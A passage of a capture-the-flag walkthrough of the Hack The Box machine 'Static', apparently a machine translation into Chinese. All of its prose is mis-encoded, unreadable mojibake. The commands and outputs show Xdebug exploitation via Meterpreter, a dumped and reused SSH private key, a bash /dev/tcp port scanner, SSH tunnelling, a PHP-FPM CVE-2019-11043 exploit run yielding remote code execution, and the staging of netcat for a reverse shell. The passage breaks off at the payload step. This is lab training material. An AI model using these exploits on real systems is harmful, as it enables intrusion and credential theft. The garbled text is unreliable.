nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl http://172.20.0.10</span></pre><p id="3961" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„tun9 IPä¸webæœåŠ¡å™¨ä½äºä¸åŒçš„å­ç½‘ã€‚æˆ‘ä»¬å¯ä»¥å‘æˆ‘ä»¬çš„æ¥å£æ·»åŠ ä¸€æ¡æ–°çš„è·¯ç”±ï¼Œä»¥å…è®¸æˆ‘ä»¬åˆ°è¾¾ä¸åŒçš„ç½‘ç»œã€‚<a class="ae nl" href="https://www.cyberciti.biz/faq/ip-route-add-network-command-for-linux-explained/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å¾ˆå¥½çš„è§£é‡Šäº†å¦‚ä½•æ·»åŠ è·¯çº¿ã€‚è®©æˆ‘ä»¬ç°åœ¨å°±å¼€å§‹å§:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="dcfd" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ip route add 172.20.0.0/24 dev tun9</span></pre><p id="8219" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥è¿›å…¥ç½‘ç»œæœåŠ¡å™¨:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="dad5" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# traceroute 172.20.0.10             <br/>traceroute to 172.20.0.10 (172.20.0.10),30 hops max,60 byte packets<br/> 1  172.30.0.1 (172.30.0.1)  25.670 ms  27.471 ms  28.446 ms<br/> 2  172.20.0.10 (172.20.0.10)  28.349 ms  28.312 ms  28.214 ms</span></pre><p id="f110" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æˆ‘ä»¬ç»§ç»­ä¹‹å‰ï¼Œæˆ‘é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œè¿™ä¸ªåˆ°webæœåŠ¡å™¨çš„VPNè¿æ¥ä¸ç¨³å®šã€‚æˆ‘å‘ç°ä¸ºäº†ä¿æŒå¯é æ€§ï¼Œæˆ‘å¿…é¡»åƒè¿™æ ·å‡å°‘MTU:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="c430" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# ifconfig tun9 mtu 1200<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ifconfig tun9<br/>tun9: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1200<br/>        inet 172.30.0.10  netmask 255.255.0.0  destination 172.30.0.10<br/>        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)<br/>        RX packets 3  bytes 252 (252.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 5  bytes 348 (348.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="2838" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å»ºè®®ä½ è¿™æ ·åšï¼Œå¦åˆ™ä½ å¯èƒ½ä¼šæµªè´¹å¾ˆå¤šæ—¶é—´æŒ å¤´ï¼</p><p id="0ce5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æµè§ˆå™¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/2a0b556568ba2904c0ad2c86f2e6dded.png" data-original-src="https://miro.medium.com/v2/resize:fit:796/format:webp/0*eYIKFStirY3lrr81.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">WebæœåŠ¡å™¨å†…å®¹</figcaption></figure><h1 id="ac61" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">XDebug</h1><p id="51b8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªphpä¿¡æ¯æ–‡ä»¶:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nt"><img src="../Images/3a251a05e09205a3ceac7d5546b155f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*C2h-6WilgDMgRp5z.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">WebæœåŠ¡å™¨phpä¿¡æ¯</figcaption></figure><p id="f126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æµè§ˆæ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°xdebugéƒ¨åˆ†åœ¨åº•éƒ¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nu"><img src="../Images/608e905c8ebd7661aa6a274d242dffe1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*wQK1HvXQGnfh9455.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">WebæœåŠ¡å™¨xdebugå·²å¯ç”¨</figcaption></figure><h1 id="718d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ°´è¡¨è¯»æ•°å™¨</h1><p id="0d03" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åœ¨å¦ä¸€ä¸ªåä¸º<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/135" rel="noopener ugc nofollow" target="_blank"> Olympus </a>çš„ç›’å­ä¸­ä¹Ÿå‘ç°äº†åŒæ ·çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨åŒæ ·çš„Metasploitæ–¹æ³•ã€‚<a class="ae nl" href="https://www.acunetix.com/vulnerabilities/web/xdebug-remote-code-execution-via-xdebug-remote_connect_back/" rel="noopener ugc nofollow" target="_blank">è¿™ç¯‡</a>æ–‡ç« è§£é‡Šäº†æ¼æ´åˆ©ç”¨éœ€è¦å¯ç”¨å“ªäº›è®¾ç½®ã€‚å½“æˆ‘ä»¬æ£€æŸ¥æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤å®ƒä»¬å·²è®¾ç½®å¥½ï¼Œå› æ­¤è®©æˆ‘ä»¬å¯åŠ¨Meterpreter:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nv"><img src="../Images/eda45e68ab067300bf6ca0d95d2c83ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tjFdEEzewP25J6ymYYeSjw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ä½¿ç”¨Meterpreterå¼€å‘xdebug</figcaption></figure><p id="f607" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿æ¥ä¼šè¯åï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥shellæŸ¥çœ‹:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2b7e" class="mx km iq mt b gy my mz l na nb">meterpreter &gt; shell<br/>Process 514 created.<br/>Channel 0 created.<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/><br/>pwd<br/>/var/www/html/vpn<br/><br/>ls -lsa /home<br/>4 -rwxrwxrwx 1 root     root       33 Nov  3 13:38 user.txt<br/>4 drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data</span></pre><h1 id="160a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="d7b7" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ä¸åŒå¯»å¸¸çš„æ˜¯ï¼Œç”¨æˆ·æ ‡å¿—ä½äº/homeçš„æ ¹ç›®å½•ä¸­ï¼Œè®©æˆ‘ä»¬åœ¨è¿™é‡ŒæŠ“ä½å®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="297e" class="mx km iq mt b gy my mz l na nb">cat /home/user.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="7c27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æˆ‘ä»¬çš„ç”¨æˆ·ä¸»æ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="4991" class="mx km iq mt b gy my mz l na nb">ls -lsa /home/www-data<br/>4 drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache<br/>4 drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh<br/><br/>ls -lsa /home/www-data/.ssh<br/>4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys<br/>4 -rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa<br/>4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub<br/><br/>cat /home/www-data/.ssh/id_rsa<br/>-----BEGIN RSA PRIVATE KEY-----<br/>MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/<br/>nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ<br/>&lt;SNIP&gt;<br/>sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+<br/>s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau<br/>-----END RSA PRIVATE KEY-----</span></pre><p id="3d30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬ä»è¿™ä¸ªMetasploit shellè½¬ç§»åˆ°ä¸€ä¸ªç¨³å®šçš„SSHè¿æ¥ã€‚å¤åˆ¶æˆ‘ä»¬æ‰¾åˆ°çš„ç§äººå¯†é’¥ï¼Œå¹¶ä¼ å…¥Kaliçš„ä¸€ä¸ªæ–‡ä»¶:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="61d2" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# echo "-----BEGIN RSA PRIVATE KEY-----<br/>MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/<br/>nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ<br/>&lt;SNIP&gt;<br/>sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+<br/>s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau<br/>-----END RSA PRIVATE KEY-----" &gt; id_rsa<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# chmod 600 id_rsa</span></pre><p id="a311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å°è¯•ä½¿ç”¨SSHå¯†é’¥è¿æ¥åˆ°ä¸»é™æ€ç®±:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ddfc" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -i id_rsa_www-data www-data@10.10.10.246<br/>www-data@10.10.10.246's password: <br/>Permission denied, please try again.<br/>www-data@10.10.10.246's password: <br/>Permission denied, please try again.<br/>www-data@10.10.10.246's password: <br/>www-data@10.10.10.246: Permission denied (publickey,password).</span></pre><h1 id="29f7" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·SSHè®¿é—®</h1><p id="fc40" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è¿™ä¸èµ·ä½œç”¨ï¼Œä½†æœ‰è¶£çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨www-dataçš„SSHå¯†é’¥è¿æ¥åˆ°172 IPçš„webæœåŠ¡å™¨:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0cd9" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -i id_rsa www-data@172.20.0.10 <br/>Last login: Wed Nov  3 21:38:58 2021 from 10.10.15.41<br/>www-data@web:~$</span></pre><p id="d697" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å®ƒæ¥è¿æ¥åˆ°ä¸»é™æ€ç®±ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä»åˆå§‹æ‰«æä¸­çœ‹åˆ°çš„ç«¯å£2222ä¸Šä¹Ÿè¿è¡ŒSSH:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="40e3" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -i id_rsa www-data@10.10.10.246 -p 2222<br/>Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4<br/>www-data@web:~$</span></pre><p id="e53e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘é€€å‡ºäº†web VPNï¼Œç»§ç»­ä½¿ç”¨SSHç›´æ¥è¿æ¥åˆ°æœºå™¨ã€‚åœ¨æˆ‘æŸ¥çœ‹ç½‘ç»œè¿æ¥ä¹‹å‰ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„å˜åŒ–:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="0b75" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ ifconfig eth1<br/>eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br/>        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255<br/>        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)<br/>        RX packets 392  bytes 361065 (361.0 KB)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 498  bytes 36481 (36.4 KB)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="bef9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ç¬¬äºŒä¸ªåˆ°ä¸åŒç½‘ç»œçš„è¿æ¥ï¼Œæœºå™¨ä¸Šæ²¡æœ‰nmapã€‚æˆ‘åšäº†ä¸€ä¸ªç®€å•çš„å¾ªç¯æ¥æ‰«æç½‘ç»œ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="9779" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ for i in {1..254} ;do (ping -c 1 192.168.254.$i | grep "bytes from" &amp;) ;done</span><span id="0884" class="mx km iq mt b gy nw mz l na nb">64 bytes from 192.168.254.1: icmp_seq=1 ttl=64 time=0.097 ms<br/>64 bytes from 192.168.254.2: icmp_seq=1 ttl=64 time=0.048 ms<br/>64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.088 ms</span></pre><p id="c7a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªIPä»¥åŠæˆ‘ä»¬è‡ªå·±çš„å›å¤ã€‚è®©æˆ‘ä»¬ä½¿ç”¨<a class="ae nl" href="https://coderwall.com/p/udnrjq/port-scanning-with-bash-without-sudo-nmap-or-nc" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æœ‰ç”¨çš„bashfuæ‰«æå®ƒä»¬çš„å¼€æ”¾ç«¯å£:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ad5b" class="mx km iq mt b gy my mz l na nb">www-data@web:/$ nmap2 () {<br/>&gt; [[ $# -ne 1 ]] &amp;&amp; echo "Please provide server name" &amp;&amp; return 1<br/>&gt; <br/>&gt; for i in {1..9000} ; do<br/>&gt;   SERVER="$1"<br/>&gt;   PORT=$i<br/>&gt;   (echo  &gt; /dev/tcp/$SERVER/$PORT) &gt;&amp; /dev/null &amp;&amp;<br/>&gt;    echo "Port $PORT seems to be open"<br/>&gt; done<br/>&gt; }<br/><br/>www-data@web:/$ nmap2 192.168.254.1<br/>Port 22 seems to be open<br/>Port 2222 seems to be open<br/><br/>www-data@web:/$ nmap2 192.168.254.2<br/>Port 22 seems to be open<br/>Port 80 seems to be open<br/><br/>www-data@web:/$ nmap2 192.168.254.3<br/>Port 80 seems to be open</span></pre><p id="917a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å›å¤´çœ‹çœ‹æˆ‘ä»¬ä¹‹å‰æ‰¾åˆ°çš„ITæ”¯æŒé—¨æˆ·ï¼Œæˆ‘æ³¨æ„åˆ°192.168.254.3ä½œä¸ºä¸€ä¸ªåä¸ºpkiçš„æœåŠ¡å™¨åˆ—åœ¨é‚£é‡Œã€‚ä»æ‰«æä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç«¯å£80æ˜¯æ‰“å¼€çš„ï¼Œä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è¿™ä¸ªSSHè¿æ¥ä»Kaliå»ºç«‹ä¸€ä¸ªç«¯å£éš§é“ã€‚æˆ‘ä»¬ä¹‹å‰å·²ç»è¿™æ ·åšè¿‡å¾ˆå¤šæ¬¡äº†ï¼Œæ¯”å¦‚åœ¨<a class="ae nl" href="https://pencer.io/ctf/ctf-thm-game-zone" rel="noopener ugc nofollow" target="_blank"> GameZone </a>ä¸Šï¼Œæˆ‘ä»¬ç®€å•åœ°è½¬å‘ç«¯å£80:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="937e" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa<br/>www-data@web:~$</span></pre><h1 id="b3b2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PKIæœåŠ¡å™¨</h1><p id="fa02" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»è¯´è¿‡ï¼ŒKaliä¸Šä»»ä½•åˆ°ç«¯å£80çš„æµé‡éƒ½é€šè¿‡SSHè¿æ¥è½¬å‘åˆ°ç«¯å£2222ä¸Šçš„10.10.10.246ï¼Œå¹¶å°†å…¶ä¼ é€’åˆ°ç«¯å£80ä¸Šçš„192.168.254.3ã€‚è¿™é‡Œæœ‰ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« <a class="ae nl" href="https://www.ssh.com/academy/ssh/tunneling/example" rel="noopener ugc nofollow" target="_blank">å¯¹æ­¤åšäº†æ›´å¤šçš„è§£é‡Šã€‚</a></p><p id="227a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®pkiæœåŠ¡å™¨äº†:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="b266" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl -i localhost<br/>HTTP/1.1 200 OK<br/>Server: nginx/1.14.0 (Ubuntu)<br/>Date: Wed, 03 Nov 2021 22:27:24 GMT<br/>Content-Type: text/html; charset=UTF-8<br/>Transfer-Encoding: chunked<br/>Connection: keep-alive<br/>X-Powered-By: PHP-FPM/7.1<br/><br/>batch mode: /usr/bin/ersatool create|print|revoke CN</span></pre><p id="e3d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½å§ï¼Œæˆ‘æ‰¿è®¤æˆ‘æœŸå¾…æ›´å¤šï¼æœç´¢PHP-FPMæ¼æ´ä¼šå‘ç°Githubä¸Šæœ‰å¾ˆå¤šé€‰é¡¹ï¼Œæ¯”å¦‚<a class="ae nl" href="https://github.com/AleWong/PHP-FPM-Remote-Code-Execution-Vulnerability-CVE-2019-11043-" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªã€<a class="ae nl" href="https://github.com/neex/phuip-fpizdam" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªæˆ–è€…<a class="ae nl" href="https://github.com/theMiddleBlue/CVE-2019-11043" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ªã€‚æˆ‘é€‰æ‹©äº†æœ€ç®€å•çš„ï¼Œä¸€ä¸ªç®€å•çš„Pythonè„šæœ¬:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nx"><img src="../Images/4244dae8fd76e052fe0699c1b4476a48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*03jt_eBwtzOYS3IAseZYkQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">PHP-FPMæ¼æ´</figcaption></figure><h1 id="8900" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">RCEåˆ©ç”¨</h1><p id="03f0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥é€šè¿‡éš§é“åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œå®ƒ:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="ec39" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# python3 exploit.py --url http://localhost/index.php<br/>[*] QSL candidate: 1754, 1759, 1764<br/>[*] Target seems vulnerable (QSL:1754/HVL:224): PHPSESSID=d129421703528e986f0c21155dd4b765; path=/<br/>[*] RCE successfully exploited!<br/><br/>    You should be able to run commands using:<br/>    curl http://localhost/index.php?a=bin/ls+/</span></pre><p id="1c5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">çœ‹èµ·æ¥ä¸é”™ï¼Œæˆ‘ä»¬è¯•è¯•å§:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="754a" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# curl -s http://localhost/index.php?a=/usr/bin/id<br/>[03-Nov-2021 22:41:23 UTC] PHP Warning:  Unknown: Unable to load dynamic library 'uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>' - uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><p id="4bc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å¯è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡éš§é“è¿œç¨‹æ‰§è¡Œä»£ç åˆ°æœåŠ¡å™¨ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½åœ¨pkiæœåŠ¡å™¨ä¸Šæ‰§è¡Œåå‘shellï¼Œå¹¶åœ¨Kaliä¸Šå°†å…¶æ•è·å›æ¥ã€‚ç›¸åï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸­é—´çš„webæœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¤åˆ¶netcatçš„é™æ€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºå®ƒç›®å‰ä¸åœ¨æœºå™¨ä¸Šã€‚</p><p id="b4ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Githubä¸Šæœ‰å¾ˆå¤šé€‰é¡¹ï¼Œæˆ‘ç”¨çš„æ˜¯<a class="ae nl" href="https://github.com/H74N/netcat-binaries/blob/master/nc" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>çš„:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi ny"><img src="../Images/fa02d0473b184a54ed244582e51e6a54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HGJPmF8eeL2c5JZwbuB2Cw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ä¸‹è½½ncçš„é™æ€ç‰ˆæœ¬</figcaption></figure><p id="f149" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬è¿˜éœ€è¦å¸¦ä¸Šcurl overï¼Œæˆ‘ç”¨çš„æ˜¯<a class="ae nl" href="https://github.com/moparisthebest/static-curl" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ä¸€ä¸ª:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nz"><img src="../Images/b557cb32dc527423eb1ae408db569303.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i55I7Wi2ReuYu47jb5CWhw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ä¸‹è½½curlçš„é™æ€ç‰ˆæœ¬</figcaption></figure><p id="0cfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬éœ€è¦å°†å®ƒä»¬å¤åˆ¶åˆ°webæ¡†ä¸­:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="237c" class="mx km iq mt b gy my mz l na nb">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# scp -P 2222 -i id_rsa nc  www-data@10.10.10.246:/tmp<br/>nc                               100%  762KB   1.8MB/s   00:00<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/static]<br/>â””â”€# scp -P 2222 -i id_rsa curl-amd64  www-data@10.10.10.246:/tmp<br/>curl-amd64                       100% 3371KB   2.1MB/s   00:01</span></pre><h1 id="c677" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åå‘å¤–å£³æœ‰æ•ˆè´Ÿè½½</h1><p id="0037" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æœ€åï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ã€‚æˆ‘ä»¬å¯ä»¥ä»<a class="ae nl" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" 